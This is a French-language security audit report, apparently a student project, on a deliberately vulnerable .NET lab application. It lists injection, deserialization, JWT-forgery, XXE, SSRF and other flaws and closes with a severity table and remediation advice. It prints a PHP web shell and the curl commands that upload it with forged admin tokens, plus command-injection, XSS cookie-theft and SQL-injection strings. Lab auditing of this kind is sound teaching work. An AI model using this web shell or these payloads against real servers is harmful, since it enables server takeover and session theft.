
# 🔐 Audit de sécurité – Vulnerable Light App

## 📌 Objectifs

- Identifier les vulnérabilités de sécurité dans le code source de l’application.
- Evaluer l’impact et la gravité de chaque vulnérabilité.
- Valider l’exploitabilité via des tests d’intrusion.
- Proposer des recommandations correctives.

---

## 🧪 Méthodologie

- **Analyse statique** : lecture manuelle du code source (C#, .NET).
- **Analyse dynamique** : tests d’exploitation sur une instance locale de l’application.
- **Référentiel** : classification selon les références MITRE CWE.

---

## 📋 Bilan des vulnérabilités

### 🎯 Vulnérabilités exploitées avec succès

- OS Command Injection (CWE-78)
- Désérialisation non sécurisée (CWE-502)
- JWT forgé avec alg=none + secret exposé (CWE-1270 / CWE-798)
- Upload de fichier malveillant (CWE-434)
- Path Traversal & LFI (CWE-22 / CWE-829)
- XML External Entity (CWE-611)
- SSRF (CWE-918)
- Injection XSS stockée dans logs HTML (CWE-79)
- Injection SQL (CWE-89)
- Injection XML (CWE-91)
- Remote File Inclusion (CWE-98)
- Business Logic Error (CWE-840)
- IDOR (CWE-639)
- Buffer Overflow (CWE-787)
- Journalisation de credentials (CWE-532)
- Mauvaises politiques JWT (CWE-213)
- Contrôle d'accès incorrect (CWE-284)

---

## 🧪 Tests d'intrusion

### A. Authentification avec JWT

Nous avons utilisé un token JWT valide pour s’authentifier.

![image](https://github.com/user-attachments/assets/c21ed756-d781-4f74-b083-dd4aad6c96cf)


---

### B. Exploitation de l’IDOR (CWE-639)

Modification de l’ID dans l’URL : accès aux données d'autres employés.

![image](https://github.com/user-attachments/assets/0e2532fd-29f3-44dc-933a-bc25a86b0ce7)


---

### C. Path Traversal (CWE-22)

Accès au fichier source `Controller.cs` via contournement des protections.

![image](https://github.com/user-attachments/assets/460d5010-aba5-4f25-b928-ed6974f7807e)


---

### D. Command Injection (CWE-78)

Injection via `; whoami` dans un champ censé être un nom de domaine.

![image](https://github.com/user-attachments/assets/0bdc709c-5130-4421-867e-ce7ee6279671)


---

### E. Désérialisation (CWE-502)

Payload JSON contenant un objet `System.Diagnostics.Process`.

![image](https://github.com/user-attachments/assets/11aca746-3a0d-4b7d-8fb9-dbc883ed6add)


---

### F. Exécution de code C# (CWE-94)

Tentative d’évaluation dynamique. Résultat : erreur de compilation confirmant la vulnérabilité.

![image](https://github.com/user-attachments/assets/d921af55-3cf1-4254-ab6d-e3784a8b1cef)
![image](https://github.com/user-attachments/assets/6cbdffa1-33de-4939-b651-74b3bf2d2626)



---

### G. Upload de fichier malveillant (CWE-434)

Fichier `shell.php.svg` uploadé et accessible.

Nous avons commencé par créé un fichier nommé « shell.php.svg » contenant du code PHP malveillant : 
1. <?php system($_GET["cmd"]); ?>

Nous avons ensuite uploadé le fichier en utilisant la commande suivante : 
1. curl -k -X PATCH "https://localhost:3000/Patch" \
2.   -H "X-Forwarded-For: 10.10.10.256" \
3.   -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJJZCI6ImFkbWluIiwiSXNBZG1pbiI6IlRydWUiLCJuYmYiOjE3NDY5MDUzNjAsImV4cCI6MTc3ODQ0MTM2MCwiaWF0IjoxNzQ2OTA1MzYwfQ.k0AB5Olhf4LRIg4t8BELqW8gug1QA_A7LOYeowfk-eg' \
4.   -F "file=@shell.php.svg;type=image/svg+xml"

La requête a réussi et le serveur a répondu avec : 
![image](https://github.com/user-attachments/assets/35ff3661-cb6a-45a9-98d8-10308d2ff628)

Nous avons ensuite vérifié que le fichier était accessible et que son contenu était intact :
1. curl -k "https://localhost:3000/?lang=shell.php.svg" -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJJZCI6InVzZXIiLCJJc0FkbWluIjoiRmFsc2UiLCJuYmYiOjE3MjUyNjY1MDksImV4cCI6MTc1NjgwMjUwOSwiaWF0IjoxNzI1MjY2NTA5fQ.D_RUjJiR4eptm1DJqpPEOYMEbP6fFWgRX7ylZIFHtSE'

La réponse : 
![image](https://github.com/user-attachments/assets/795021f3-4589-467a-b728-0328852190f3)

---

### H. JWT forgé (CWE-1270 / CWE-798)

Token avec alg `none` accepté ou signé avec secret trouvé.

![image](https://github.com/user-attachments/assets/9cbc5616-2fbb-461f-81b1-5dd23229a9b4)
![image](https://github.com/user-attachments/assets/18dce359-2eb1-460d-b00a-306549a46218)

![image](https://github.com/user-attachments/assets/ab9dceee-2531-42f5-9b36-29b23bba7ab6)

---

### I. XXE (CWE-611)

Fichier XML avec entité externe lisant `appsettings.json`.

![image](https://github.com/user-attachments/assets/86c7b1c5-ede6-47ed-a2e5-a37cb9b1d351)
![image](https://github.com/user-attachments/assets/e57e559d-5c23-4896-949b-fce58b5abd82)
![image](https://github.com/user-attachments/assets/b02bbe43-201a-4d52-ad52-c78bb331326a)

---

### J. SSRF (CWE-918)

Tentative de requête vers `localhost:8080`. Erreur confirmant l'accès côté serveur.

![image](https://github.com/user-attachments/assets/91c36b8c-3def-45ae-b73e-ae59aa31b82f)


---

### K. Buffer Overflow (CWE-787)

Payload long provoquant une coupure de la connexion TLS.

![image](https://github.com/user-attachments/assets/399d014f-121c-499d-a9ff-7871d0c10ecd)


---

### L. Business Logic Error (CWE-840)

Dépassement d’entier entraînant une valeur négative inattendue.

![image](https://github.com/user-attachments/assets/c9a23e75-a98f-4684-9a49-a53a8a1dcd5f)


---

### M. Logs avec credentials en clair (CWE-532)

Injection de commande pour lire les logs contenant des mots de passe.

![image](https://github.com/user-attachments/assets/c67ce821-23d6-4fdb-9075-e3996515ade2)


---

### N. XSS dans les logs (CWE-79)

Payload `<img onerror=alert(document.cookie)>` exécuté côté admin.

![image](https://github.com/user-attachments/assets/891b0bb4-3274-44e2-808c-1072d05d0821)


---

### O. Injection SQL (CWE-89)

Tentative de login avec `' OR 1=1 --` provoquant une erreur SQL révélatrice.

![image](https://github.com/user-attachments/assets/23d5eebc-ada9-4e55-8068-225a8d9fefa9)


---

### P. XML Injection (CWE-91)

Payload XML contenant une structure modifiée acceptée et interprétée.

![image](https://github.com/user-attachments/assets/efb1cc93-1957-49cb-b736-a74738342f3e)


---

### Q. Remote File Inclusion (CWE-98)

Fichier SVG inclus dans une réponse côté serveur.

![image](https://github.com/user-attachments/assets/5294f34c-1305-4b67-94e7-c517ce654af3)

![image](https://github.com/user-attachments/assets/a832e891-3ad5-4ab4-9e10-03a555734a1c)


---

## 📊 Impact et criticité des vulnérabilités

| Vulnérabilité                        | CWE             | Gravité   | Exploitabilité | Impact potentiel                                        | Priorité    |
|-------------------------------------|-----------------|-----------|----------------|----------------------------------------------------------|-------------|
| Injection de commandes OS           | CWE-78          | Critique  | Facile         | Exécution root, compromission complète du serveur       | 🔴 Haute    |
| JWT vulnérable + secret exposé      | CWE-1270 / 798  | Critique  | Facile         | Auth bypass, élévation de privilège                     | 🔴 Haute    |
| Désérialisation non sécurisée       | CWE-502         | Critique  | Moyenne        | Exécution de code arbitraire                            | 🔴 Haute    |
| Upload de fichiers dangereux        | CWE-434         | Critique  | Moyenne        | Inclusion de fichiers malveillants                      | 🔴 Haute    |
| Remote File Inclusion               | CWE-98          | Haute     | Moyenne        | Inclusion de contenu arbitraire                         | 🟠 Haute    |
| Path Traversal / LFI                | CWE-22 / 829    | Haute     | Facile         | Lecture de fichiers sensibles, code source              | 🟠 Haute    |
| XXE / SSRF                          | CWE-611 / 918   | Haute     | Moyenne        | Accès fichiers locaux ou requêtes internes              | 🟠 Haute    |
| Code C# dynamique (eval)            | CWE-94          | Haute     | Moyenne        | Injection de code dans l'exécution                      | 🟠 Haute    |
| Buffer Overflow                     | CWE-787         | Moyenne   | Moyenne        | Crash application, instabilité                          | 🟡 Moyenne  |
| Erreur de logique métier            | CWE-840         | Moyenne   | Moyenne        | Bypass des calculs, facturation corrompue               | 🟡 Moyenne  |
| IDOR / Accès non autorisé           | CWE-639 / 284   | Moyenne   | Facile         | Accès à des données d'autres utilisateurs               | 🟡 Moyenne  |
| Injection SQL (DataSet)             | CWE-89          | Moyenne   | Faible         | Contournement logique partiel                           | 🟡 Moyenne  |
| Injection XML                       | CWE-91          | Moyenne   | Moyenne        | Perturbation des structures XML                         | 🟡 Moyenne  |
| XSS dans les logs HTML              | CWE-79          | Moyenne   | Facile         | Exécution JS côté admin (session hijack possible)       | 🟡 Moyenne  |
| Infos sensibles dans les logs       | CWE-532 / 200   | Moyenne   | Facile         | Récupération des credentials                            | 🟢 Moyenne  |
| Mauvaises politiques d’auth JWT     | CWE-213         | Moyenne   | Facile         | Acceptation de tokens falsifiés                         | 🟢 Moyenne  |

---

## ✅ Recommandations générales

- Appliquer des **validations strictes** sur toutes les entrées utilisateur.
- Mettre en place une **authentification robuste** (limite de tentatives, mot de passe fort).
- Supprimer les **secrets en clair** du code source.
- Restreindre les droits d’exécution des fichiers uploadés.
- Implémenter une **politique de journalisation sécurisée**.
- Éviter les fonctions d’exécution dynamique (`eval`, `stackalloc`, etc.).
- Adopter une approche **DevSecOps** avec des outils d’analyse continue.

---

## 🧾 Conclusion

Cet audit a révélé plusieurs vulnérabilités critiques qui, si elles étaient exploitées dans un environnement réel, pourraient compromettre l’intégrité, la confidentialité et la disponibilité de l’application. La majorité des failles ont pu être exploitées avec succès dans un environnement de test contrôlé, ce qui confirme leur réalisme.

L'application nécessite une refonte ou un renforcement significatif de ses mécanismes de sécurité. Les vulnérabilités critiques doivent être corrigées en priorité. Cet audit démontre l’importance de la sécurité dès la conception, et l’utilité d’un processus d’audit continu dans le cycle de vie logiciel.

---

🛡️ *Audit réalisé par Bryan MARLOT – ESGI 24-25 – 2025*
